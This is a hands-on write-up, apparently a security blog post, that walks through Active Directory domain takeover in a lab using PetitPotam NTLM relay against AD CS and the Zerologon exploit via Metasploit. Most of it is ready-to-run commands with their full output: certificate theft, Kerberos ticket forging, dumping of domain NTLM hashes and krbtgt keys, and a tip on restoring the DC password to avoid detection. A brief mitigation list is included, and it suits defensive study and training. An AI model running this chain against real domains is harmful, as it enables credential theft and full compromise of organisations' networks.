---
title: <span style="color:lime">Active Directory Domain Attacks</span>
permalink: /ad-domain-attack/
author_profile: false
categories:
  - Active Directory
  - Attack
tags:
  - exploits
  - PetitPotam
  - Zerologon
  - ADCS
sidebar:
  - title: ""
    image: /assets/images/petitpotam.png
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---

## Introduction

One of the ultimate goals of a Hacker is to get full administrative access to Active Directory Domain that literally makes your Mr. God in
the Windows world. This "little" write up will give you a glance how to this by explianing two potential attack vectors 
<span style="color:lime">"Zerologon"</span> and <span style="color:lime">"PetitPotam / ADCS"</span> exploitation.

To demonstrate these two attacks, I have created a small test bed with an Active Directory /DNS server and a Certificate server (ADCS).

Domain: `victim.com`\
DC / DNS hostname: `advictim2012r2`\
FQDN: `advictim2012r2.victim.com`\
IP: `192.168.201.9`\
\
ADCS hostname: `cavictim2012r2`\
FQDN: `cavictim2012r2.victim.com`\
IP: `192.168.100.10`\
\
All above are Windows Server 2012R2 evaluation versions with no patches applied.

Check out the references below if you need help setting up your own environment. 

[Setting up a Domain Controller](https://techdirectarchive.com/2020/01/08/how-to-setup-dc-setting-up-the-two-domain-controllers/ "Setting up a Domain Controller")

[Setting up ADCS server](https://hakin9.org/domain-takeover-with-petitpotam-exploit/ "Setting up a Certificate (ADCS) server")

Again the assumption is that you have Kali Linux installed and operational because we will use this platform to perform the attack and compromise the domain.

## Domain take-over with PetitPotam and ADCS
Deployment of an Active Directory Certificate Services (ADCS) on a corporate environment could allow system administrators to utilize it for establishing trust between different directory objects. 
However, it could allow red team operators to conduct an NTLM relay attack towards the web interface of an ADCS in order to compromise the network. 
The web interface is used for allowing users to obtain a certificate (web enrollment), is over HTTP protocol, doesn’t support signing and accepts NTLM authentication.

The details of the attack have been presented by Will Schroeder and Lee Christensen in the Certified Pre-Owned whitepaper. 
The attack forces the domain controller machine account (`ADVICTIMR2$` in our lab) to authenticate towards a host which NTLM relay is configured. 
The authentication is relayed towards the Certificate Authority (CA) and raises a request for a certificate. 
Once the certificate is generated for the `ADVICTIMR2$` account an attacker could use this perform arbitrary operations on the domain controller such as retrieving the hash of the Kerberos account in order to create a golden ticket, 
establish domain persistence or dump hashes of domain administrators and establish a communication channel with the domain controller.

Active Directory Certificate Services can be installed as a role on the domain controller or in an individual server which is part of the domain.
The latter is the case in our lab setup.

### Tooling prerequisites
Let's discuss the tooling prerequisites to perform the attack.  

0) Python Virtual Environment\
1) ExAdndroidDev’s Impacket\
2) PetitPotam PoC @topotam77\
3) PKINITtools (Linux)

<span style="color:yellow"><i class="fa fa-info-circle"></i></span>
With latest version of Kali Linux, the Impacket version that comes with the Kali distribution will do the trick.
You can find Impacket at the following directory `/usr/share/doc/python3-impacket/examples/`, and you might want to decide to skip point 1).
{: .notice--info}

#### 0. Python Virtual Environment Installation
First install the python virtual environment so that you will not break your official Kali Linux Python environment.

```shell
apt install python3-venv
mkdir pyvirtenv
python3 -m venv pyvirtenv
source pyvirtenv/bin/activate
```
#### 1. ExAdndroidDev’s Impacket installation
Install this version of Impacket in your python virtual environment (not needed with the latest Kali Linux distributions [2021 and above]).

```shell
cd pyvirtenv
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
python3 setup.py install
```
#### 2. PetitPotam installation

```shell
cd pyvirtenv
git clone https://github.com/topotam/PetitPotam
cd PetitPotam
sudo pip3 install -r requirements.txt
```

#### 3. PKINITtools installation

```shell
cd pyvirtenv
git clone https://github.com/dirkjanm/PKINITtools
cd PKINITtools
sudo pip3 install -r requirements.txt
```
Let's rock'n roll and execute the attack...

### The attack

Lets first launch the ntlmrelay to start listening for inbound authentication attempts from the domain controller targeted with PetitPotam.
Before typing all the commands, ensure that your Kali Linux machine resolves the FQDN of the Certificate server (ADCS) and Active Directory Domain controller 
by adding the DNS server IP running on the Domain Controller at /etc/resolv.conf.

/etc/resolv.conf:
```text
# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
#     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
# 127.0.0.53 is the systemd-resolved stub resolver.
# run "resolvectl status" to see details about the actual nameservers.

nameserver 192.168.201.9 # Domain controller IP hosting the DNS server
``` 
Launch the ntlmrelay listener targeting web enrollment url of the certificate server (http://cavictim2012r2.victim.com/certsrv/certrqus.asp).
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# python3 impacket/examples/ntlmrelayx.py -debug -smb2support --target http://cavictim2012r2.victim.com/certsrv/certrqus.asp --template DomainController --adcs
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /root/pyvirtenv/lib/python3.10/site-packages/impacket
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```
Next, we lauch the PetitTotam against the domain controller `ADVICTIM2012R2` in another shell session.
Command arguments are pretty simple, first argument is the IP of your Kali Linux machine and the second argument is the IP of the domain controller.
```shell
┌──(root💀coolhostname)-[~/pyvirtenv]
└─# python3 PetitPotam/PetitPotam.py 192.168.201.20 192.168.201.9


              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.201.9[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

In the other session you will see the response from the ntlmrelay listener and it will give you the certificate for the machine account `ADVICTIM2012R2$` without any authentication needed.\
\
<span style="color:lime">-------- Oepsie !!! ---------</span>

```shell
[*] Authenticating against http://cavictim2012r2.victim.com as VICTIM/ADVICTIM2012R2$ SUCCEED
[*] SMBD-Thread-4 (process_request_thread): Connection from VICTIM/ADVICTIM2012R2$@192.168.201.9 controlled, attacking target http://cavictim2012r2.victim.com
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://cavictim2012r2.victim.com as VICTIM/ADVICTIM2012R2$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ADVICTIM2012R2$:
MIIRtQIBAzCCEW8GCSqGSIb3DQEHAaCCEWAEghFcMIIRWDCCB48GCSqGSIb3DQEHBqCCB4Awggd8AgEAMIIHdQYJKoZIhvcNAQcBMBwGCiqGSI
b3DQEMAQMwDgQIotjk2P2yia0CAggAgIIHSG21MOi4oTSsSF8mdBc/lI2BO2mS8DNhhRUatCFJjsqEjv28vYGssGAI57MKDqFX0KizI5GDwhG4
VTqbvDAItFISe+lWssSsD6haS47K4R3+e9b0Han8eJmhFE4JW3zKJBjPj0rLfFebZjWZak9eTKyc+en/yBs887nPXzqlNzKEJWORZ4TZRg7fEi
aSUIdlDN/keAhVa1v7tRJeRmVRIRd++s2rhheyNv137tan1Mr1Ci045DEpvxTJXxjR3qfZTowlnkMzR0HNnol49kfOjRouVWNfiwziLvwPVvF8
F2ZPs4A3ncp6chTa+RFaHApZ2byRBF8+4hxjEg37UO6igWNOS+SCt5IeKA3epcUS4QMbRy/sKn7A+aQTHfBOrOf9eWdWwRwmE7iib7xQH1K7PU
OIOCLP3BnZ6DQEhcTJwGPoayM8oNYj+1jjZWhLF05klZ7qRnrz9d6nfh4GD8F8mrizS6Qj5fAvSB09R0fn5+nPJB81eNcj9D+yo8S3BxK3WuPN
g+17E6ElAOPdcFoqmY6wErzOsr85wgohOpuxJi5Y4xN7fw2r6ad8jGr8wFpFJKUlN8SgFhxa+DqZ9MvVOYUgDv/OM0egmafLrdoNQMXYS6HiSa
0C+sKV13d90Lery8POWU1EfVYxOEAHU3o2ZnZ+DJ77p9FH0KkSzE7/x2D4iqg2PaBkN36EW5myzJGC3KtHmLKeIEJwoHpChkDAupeUdnjLlFHb
mizM1r51Bh3i/CRBwmQXDkgJG8MwuyISqmLR7t/gjJtojOmqxo6l4TCBw50rBDwyWQGp7jVHVi0xghe7LKLbFxDEN14kSG+qWhaCIrOHXyrJkY
Z0DuUqXl3EZLL6kPPXfZZ1aaN5xhG55lXF0YouelqNqZACGOyHnuEQVSaogcM9Pq0zQA5nrJWYoj+Qsd6ZL0Aku+G1OwQiRVQcL2fmAL7dw/My
6MJ1GuUIoTYfeHGYm9iqZSKgvfhvHsSgBkr3Mn4NfGrVFwwV7NeRqElmlZO8w0eOjfCSv7ggvcZ7uJ1g6yDXHy2KKqn2tsicApK/7mDucQEnJu
NdypW6tc9x4XzfDFGlZ4V9LAv9qYimX0v9NEaRrZWHNNA95N4qcsxGGFnCkG+F3a9PHgwA1+AMhHjwLIOIb5EB0uecsy1JlLu2o4MwggnBBgkq
hkiG9w0BBwGgggmyBIIJrjCCCaowggmmBgsqhkiG9w0BDAoBAqCCCW4wgglqMBwGCiqGSIb3DQEMAQMwDgQIgnJAMbSMz5ECAggABIIJSI24e2
cXUfGAXYWhScNXdmrXz7OqwPPvYX+t7V45CCpJd/mjW8zR4m+rMO+Q8zftIW9ZR2Mp65IbuBXq1KLtqLez9dbyqFt4hMCThRhZ8jkG0Rm/tSot
akJsKKeWfdinr58G6RahcsCOjpa/jlzTjqQEsN4faL5VSkf00K2Z3SP3H3drJ9HRwlwp6y2dQ6dPfGFTvJqHzfSaGJ7CgKZAHneIdreOKpotb1
3EQJ1VTaDx4i+RwHqcIHzhTeDeB1jfE4ybh316RvL0cuULs3k0ZoPF7pJ7PPe/9B1gkdEiUvYoo+1W42JuQ03RtVRUdIyv/1hiZN6a2eCaNWMM
...etc
yE4JTYCKREBQwORtWHXInaVraRgs3QwNQYBVa/aCQv5tQfeZDcy6s3raOLTCVSnVOBCS82a1t3QmXASDJoifTx7i4hxDRCpWUudcrkUaUtDCtp
[*] Skipping user ADVICTIM2012R2$ since attack was already performed
```
Now lets copy this base64 certicate and store it in a file crt.pfx.b64.
Next decode its contents and write it to a separate file using a command similar to the one below: 
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# cat crt.pfx.b64 | base64 -d > crt.pfx
```

Now the next level comes into play where we will use the DirkJam tooling to get kerberos ticket of the AD machine account `ADVICTIM2012R2$`.
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# python3 PKINITtools/gettgtpkinit.py -cert-pfx crt.pfx victim.com/ADVICTIM2012R2\$ out.ccache
2022-05-16 08:16:49,030 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-05-16 08:16:51,876 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-05-16 08:16:52,241 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-05-16 08:16:52,241 minikerberos INFO     fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
INFO:minikerberos:fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
2022-05-16 08:16:52,247 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```
You need the following for the command to work:
- The internal domain name (victim.com)
- The hostname of the DC (ADVICTIM2012R2$) you triggered authentication with using PetitPotam. Don’t forget to escape the $ with a backslash
- Decoded version of the Base64 PFX you just generated with ntlmrelayx (crt.pfx)

When successfull, you can continue to use the kerberos ticket and AS-REP key to get the NT hash.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span> 
In this phase, i had some issues and got several errors such as:\
Error Name: KDC_ERR_CLIENT_NOT_TRUSTED Detail: "The client trust failed or is not implemented".\
Root cause in my case was that the root certificate was not properly propagated to the domain controller.\
\
Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADATA type (pre-authentication data)"\
The above error has to do with the smart card logon EKUs. I ran into this issue experimenting with Windows 2008R2 as domain controller.\
There are some words on this error in the link below.
[Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html "Authenticating with certificates when PKINIT is not supported")
{: .notice--info}

Next, we will use kerberos ticket (out.ccache) and AS-REP key to get the NT hash for the domain controller using the getnthash.py: 
```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# KRB5CCNAME=out.ccache python3 PKINITtools/getnthash.py victim.com/ADVICTIM2012R2\$ -key fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
6584bf06e7b65c680426dd1b21352f01
```
You need the following for the command to work:
- The internal domain name (victim.com)
- The hostname of the DC (ADVICTIM2012R2$) you triggered authentication with using PetitPotam. Don’t forget to escape the $ with a backslash
- The generated AS-REP key you got from gettgtpkinit.py (fac3a7b493bd2d3a32c7fb959345c11e712ef96db0e46205150cdd57938490ef)
- The generated TGT ccache file you got from gettgtpkinit.py (out.ccache)

We are almost there, just three  more commands to become Mr. God on the Active Directory domain.
First, we need to find some domain admin account that we can impersonate using the NT hash above and crackmapexec (installed by default at Kali Linux).

```shell
(pyvirtenv) ┌──(root💀coolhostname)-[~/pyvirtenv]
└─# crackmapexec ldap advictim2012r2.victim.com -u ADVICTIM2012R2\$ -H 6584bf06e7b65c680426dd1b21352f01 --admin-count
SMB         advictim2012r2.victim.com 445    ADVICTIM2012R2   [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ADVICTIM2012R2) (domain:victim.com) (signing:True) (SMBv1:True)
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   [+] victim.com\ADVICTIM2012R2$:6584bf06e7b65c680426dd1b21352f01
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Administrator
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Administrators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Print Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Backup Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Replicator
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   krbtgt
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Domain Controllers
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Schema Admins
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Enterprise Admins
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Domain Admins
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Server Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Account Operators
LDAP        advictim2012r2.victim.com 389    ADVICTIM2012R2   Read-only Domain Controllers 
```
You need the following for the command to work:
- The NT hash you just extracted (6584bf06e7b65c680426dd1b21352f01)
- The hostname of the domain controller you’re targeting (ADVICTIM2012R2)
- Crackmapexec installed

Let's take the good old Administrator account to get the silver ticket and get full domain access with the gets4uticket.py command.

```shell
(pyvirtenv) ┌──(root💀cerberus)-[~/pyvirtenv]
└─# KRB5CCNAME=out.ccache python3 PKINITtools/gets4uticket.py kerberos+ccache://victim.com\\ADVICTIM2012R2\$:out.ccache@ADVICTIM2012R2.victim.com cifs/ADVICTIM2012R2.victim.com@victim.com Administrator@victim.com Administrator.ccache -v
2022-05-16 08:32:40,215 minikerberos INFO     Trying to get SPN with Administrator@victim.com for cifs/ADVICTIM2012R2.victim.com@victim.com
INFO:minikerberos:Trying to get SPN with Administrator@victim.com for cifs/ADVICTIM2012R2.victim.com@victim.com
2022-05-16 08:32:40,548 minikerberos INFO     Success!
INFO:minikerberos:Success!
2022-05-16 08:32:40,549 minikerberos INFO     Done!
INFO:minikerberos:Done!
```
Note that you need the following for the command to work:
- The hostname of the domain controller you’re targeting (ADVICTIM2012R2)
- The generated ccache file you got from gettgtpkinit.py (out.ccache)
- A user to target and pull a silver ticket for (Administrator)
- The internal domain name (victim.com)
 
We have obtained the silver kerberos ticket as Administrator and saved it in the Administrator kerberos ticket cache (Administrator.ccache).
Now we can execute a secretdump to reveal all the credentials and hashes from the domain controller including the `famous` or maybe better the `infamous` golden ticket (krbtgt).
```shell
(pyvirtenv) ┌──(root💀cerberus)-[~/pyvirtenv]
└─# KRB5CCNAME=Administrator.ccache python3 impacket/examples/secretsdump.py -just-dc-ntlm -user-status -debug -k victim.com/Administrator@ADVICTIM2012R2.victim.com -no-pass -outputfile victim.com
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /root/pyvirtenv/lib/python3.10/site-packages/impacket
[+] Using Kerberos Cache: Administrator.ccache
[+] Returning cached credential for CIFS/ADVICTIM2012R2.VICTIM.COM@VICTIM.COM
[+] Using TGS from cache
[+] Saving output to victim.com
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
[+] Session resume file will be sessionresume_QOZpvagZ
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-500
[+] Calling DRSGetNCChanges for {b0c05beb-b058-4be4-af26-b298ed790bf6}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Administrator,CN=Users,DC=victim,DC=com
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-501
[+] Calling DRSGetNCChanges for {9be2d9b6-f416-401b-8785-8acf939cc05c}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=Guest,CN=Users,DC=victim,DC=com
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-502
[+] Calling DRSGetNCChanges for {6239cb31-4fd8-474a-b517-3e52c6907330}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=krbtgt,CN=Users,DC=victim,DC=com
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-1000
[+] Calling DRSGetNCChanges for {0111ff7d-8243-4902-af44-3f3f29bf1854}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=ADVICTIM2012R2,OU=Domain Controllers,DC=victim,DC=com
ADVICTIM2012R2$:1000:aad3b435b51404eeaad3b435b51404ee:6584bf06e7b65c680426dd1b21352f01::: (status=Enabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Calling DRSCrackNames for S-1-5-21-1063042220-3397736702-1914350276-1103
[+] Calling DRSGetNCChanges for {22087741-84b4-4d4d-8ff5-e5cdf19cd4af}
[+] Entering NTDSHashes.__decryptHash
[+] Decrypting hash for user: CN=CAVICTIM2012R2,CN=Computers,DC=victim,DC=com
CAVICTIM2012R2$:1103:aad3b435b51404eeaad3b435b51404ee:9c1ffa33539e567196cfbaa923326d3a::: (status=Enabled)
[+] Leaving NTDSHashes.__decryptHash
[+] Finished processing and printing user's hashes, now printing supplemental information
[*] Cleaning up...
```
Collected all the babies and got foothold on the domain ;-)

### In summary
You can pull off this attack in 15-20 minutes after you have gained a foothold on the internal network.
Scanning for port 445 and finding the domain controllers and certificate server is the easy part that we did not discuss here, but you probably already know how to do this.
Since ETERNALBLUE, this is probably the best and biggest exploiting path to become domain administrator because the "out of the box" domain controller and certificate configuration opens up this door for hackers to use.

Microsoft has lauched  a lot of recommendations to protect you against an attack like this such as:
- Implement LDAP signing and channel binding wherever possible;
- Enable EPA for Certificate Authority Web Enrollment in IIS on internal certificate authority servers;
- Enable EPA for Certificate Enrollment Web Service in IIS on internal certificate authority servers;
- Disable NTLM Authentication on your Windows domain controller (pipe dream, we know); and
- Disable NTLM for Internet Information Services (IIS) on AD CS Servers in your domain running the “Certificate Authority Web Enrollment” or “Certificate Enrollment Web Service” services. 

See also
[kb5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS)](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429 "KB5005413: Mitigating NTLM Relay Attacks on Active Directory Certificate Services (ADCS)") 

## Domain take-over using the Zerologon exploit
### Introduction
In a recent paper written by the Secura team, a researcher detailed a vulnerability wherein it’s possible, without authentication, to take control of an entire Active Directory domain.\
Very few pre-existing criteria must be met prior to successful exploitation. The domain controller must be accessible, with Windows MS-NRPC services enabled.\
\
The core of the vulnerability lies in a poor implementation of the ComputeNetlogonCredential call of the Netlogon Remote Protocol (MS-NRPC).\
The ComputeNetlogonCredential takes an 8-byte challenge as an input, performs a cryptographic transformation using a session key (which proves knowledge of the computer secret), and outputs an 8-byte result.\
The issue lies in an implementation flaw in the newer method AES-CFB8 (which is also the only one allowed in newer Windows versions) which is used to perform this transformation.\
\
In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key.\
However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes.
This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256.\
Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default).\
\
The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.\
\
Here is a summary of the exploitation steps:
- Establish an unsecure Netlogon channel against a domain controller by performing a brute-force attack using an 8 zero-bytes challenge and ciphertext, while spoofing the identity of that same domain controller. This would require an average of 256 attempts (given the probability of success being 1 in 256).
- Use the NetrServerPasswordSet2 call to set the domain controller account’s password, as stored in Active Directory, to an empty one. This breaks some of the domain controller functionality, since the password stored in the domain controller’s registry does not change (this is the reason step four noted below is taken).
- Use the empty password to connect to that same domain controller and dump additional hashes using the Domain Replication Service (DRS) protocol.
- Revert the domain controller password to the original one as stored in the local registry to avoid detection.
- Use the hashes dumped from stage 3 to perform any desired attack such as Golden Ticket or pass the hash using domain administrator credentials.

### The Attack
There are several ways to execute the attack, but for this demonstration we will use good old Metasploit zerologon module to exploit this vulnerability.\
The assumption is that you already gained foothold on the internal network and identified the domain controllers in the network.\
In our case, we will use the `advictim2012r2` server as our target with IP address `192.168.201.9`.

Start up Metasloit framework on Kali Linux and search for zerologon.\
Fill in IP and netbios name of the Domain controller and run check to see if the server is vulnerable to zerologon.

```shell
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > options

Module options (auxiliary/admin/dcerpc/cve_2020_1472_zerologon):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   NBNAME  advictim2012r2   yes       The server's NetBIOS name
   RHOSTS  192.168.201.9    yes       The target host(s), see https://github.com/rapid7/metasploit-frame
                                      work/wiki/Using-Metasploit
   RPORT                    no        The netlogon RPC port (TCP)


Auxiliary action:

   Name    Description
   ----    -----------
   REMOVE  Remove the machine account password


msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > check

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[*] 192.168.201.9:49155 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[*] 192.168.201.9:49155 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[+] 192.168.201.9 - The target is vulnerable.
```
As you can see, our Active Directory is vulnerable, so let's perform the attack to remove the machine account password.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span>
NOTE: Removing the machine account password (setting the null password) will introduce an inconsistency between the machine password store at the AD and the local machine password stored in registry.\
This will break the active directory domain replication with other domain controllers and can have other undesired effects.\
To minimize the impact and avoid detection, it is important to restore the machine password as soon as possible to restore the consistency.
{: .notice--info}

Removing the machine account (setting the null password).
```shell
msf6 auxiliary(admin/dcerpc/cve_2020_1472_zerologon) > exploit
[*] Running module against 192.168.201.9

[*] 192.168.201.9: - Connecting to the endpoint mapper service...
[*] 192.168.201.9:49155 - Binding to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[*] 192.168.201.9:49155 - Bound to 12345678-1234-abcd-ef00-01234567cffb:1.0@ncacn_ip_tcp:192.168.201.9[49155] ...
[+] 192.168.201.9:49155 - Successfully authenticated
[+] 192.168.201.9:49155 - Successfully set the machine account (advictim2012r2$) password to: aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 (empty)
[*] Auxiliary module execution completed
```
Now we can use the secretdump.py that comes with Impacket with the `-no-pass` option to pull the all the password hashes from the AD.

```shell
┌──(root💀coolhostname)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py 'ADVICTIM2012R2$'@192.168.201.9 -no-pass -outputfile victim.com -user-status
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f::: (status=Enabled)
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Disabled)
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4e10b53bcd24af9db5f2f9cb302d3a94::: (status=Disabled)
ADVICTIM2012R2$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: (status=Enabled)
CAVICTIM2012R2$:1103:aad3b435b51404eeaad3b435b51404ee:9c1ffa33539e567196cfbaa923326d3a::: (status=Enabled)
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:484daca6d51e63a5332b6ce83e9d24389f9f95219118efc01dd69c4bee1a032e
krbtgt:aes128-cts-hmac-sha1-96:dbbdcef9cacf1c3509e47fef1b373634
krbtgt:des-cbc-md5:bfe0453e54585b43
ADVICTIM2012R2$:aes256-cts-hmac-sha1-96:6c4942b6eb4f1110745b39a50f77952c0e398235ed27f9c333b9753f801edd27
ADVICTIM2012R2$:aes128-cts-hmac-sha1-96:401d7736faf7f88f22667c3d32c08bee
ADVICTIM2012R2$:des-cbc-md5:89cb6876a4c84616
CAVICTIM2012R2$:aes256-cts-hmac-sha1-96:23c6b2e38221f5d84be025657a295a6026007e4c7a948f691f65ecf826750452
CAVICTIM2012R2$:aes128-cts-hmac-sha1-96:c96ad9db438b318dcf0168d4b2d2d86c
CAVICTIM2012R2$:des-cbc-md5:a79badf7ec9eb0cd
[*] Cleaning up...
```
Now take one of the user accounts and password hash, in our case administrator, to run another secretsdump to retrieve the machine account.\
Search for the entry `VICTIM\ADVICTIM2012R2$:plain_password_hex:` and copy the hexstring to be used to restore the machine account password.

```shell
┌──(root💀coolhostname)-[~]
└─# python3 /usr/share/doc/python3-impacket/examples/secretsdump.py administrator@192.168.201.9 -hashes aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f -outputfile victim.com -user-status
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x783810db95179311387fe51e47d7f905
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:41b3f9ac5278dae30d67b59e3b01383f:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
